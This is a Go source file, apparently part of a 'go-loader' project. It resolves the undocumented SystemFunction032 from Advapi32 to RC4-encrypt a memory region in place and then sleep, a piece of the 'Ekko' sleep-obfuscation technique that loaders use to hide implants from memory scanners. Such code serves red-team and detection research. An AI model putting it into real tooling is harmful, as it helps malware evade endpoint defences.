package ekko

import (
	"fmt"
	"time"
	"unsafe"
	"crypto/rand"
	"go-loader/pkg/types"
	"go-loader/pkg/wincall"
)
// removed ekko sleep, it is very unreliable in this use case 

var (
	//Advapi32
	Advapi32dll           = wincall.LoadLibraryW("Advapi32.dll")
	procSystemFunction032 = func() uintptr {
		procName, _ := wincall.BytePtrFromString("SystemFunction032")
		return wincall.GetProcAddress(Advapi32dll, unsafe.Pointer(procName))
	}()
)


// EncryptMemoryRegion encrypts a memory region using SystemFunction032 (RC4)
// This is a standalone function that can be called independently
func EncryptMemoryRegion(baseAddr uintptr, size uint32, key []byte, sleepTime uint64) error {
	if len(key) == 0 {
		return fmt.Errorf("key cannot be empty")
	}
	
	var dataUString, keyUString types.UString
	

	dataUString.Buffer = (*byte)(unsafe.Pointer(baseAddr))
	dataUString.Length = size
	dataUString.MaximumLength = size
	

	keyUString.Buffer = &key[0]
	keyUString.Length = uint32(len(key))
	keyUString.MaximumLength = uint32(len(key))

	ret, _, _ := wincall.Call(procSystemFunction032,
		uintptr(unsafe.Pointer(&dataUString)),
		uintptr(unsafe.Pointer(&keyUString)),
	)

	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
	
	if ret != 0 {
		return fmt.Errorf("SystemFunction032 failed with status: 0x%X", ret)
	}
	
	return nil
}

func GenerateKey(keySize int) ([]byte, error) {
	key := make([]byte, keySize)
	_, err := rand.Read(key)
	if err != nil {
		return nil, fmt.Errorf("failed to generate random key: %w", err)
	}
	return key, nil
}